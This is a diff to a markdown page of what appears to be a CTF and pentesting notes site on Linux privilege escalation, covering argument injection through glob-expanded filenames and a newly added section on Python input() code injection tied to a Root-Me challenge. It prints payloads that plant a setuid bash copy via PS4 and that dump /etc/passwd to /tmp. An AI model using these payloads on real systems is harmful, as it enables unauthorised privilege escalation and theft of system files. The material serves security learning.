@@ -67,12 +67,12 @@ $ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
 
 <div class="row row-cols-lg-2"><div>
 
-To execute any command with filename starting with `-`, you need to use `--` such as `rm -- -la` to remove the file `-la`.
+We can inject arguments when [glob-patterns](/operating-systems/linux/_knowledge/index.md#glob-patterns) are replaced, e.g., by creating file named after the command arguments.
 
-We can inject arguments when [glob-patterns](/operating-systems/linux/_knowledge/index.md#glob-patterns) are replaced.
+To execute any command manipulating a filename starting with `-`, you need to use `--` such as `rm -- -la` to remove the file `-la`.
 </div><div>
 
-For instance, to inject `-la` into `ls`:
+For instance, to inject `-la` into `ls *`:
 
 ```shell!
 $ touch -- -la
@@ -106,4 +106,24 @@ export -f /some/path
 ```shell!
 $ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
 ```
+</div></div>
+
+<hr class="sep-both">
+
+## Special scenarios 📚
+
+<div class="row row-cols-lg-2"><div>
+
+#### Python input() function
+
+[![python_input](../../../_badges/rootme/python_input.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-input)
+
+This command is used to prompt the user for input. The problem is that we can write python code <small>(e.g., 5+5)</small>.
+
+```py
+open('/tmp/passwd_dump', 'w').write(open('/etc/passwd', 'r').read())
+```
+</div><div>
+
+...
 </div></div>
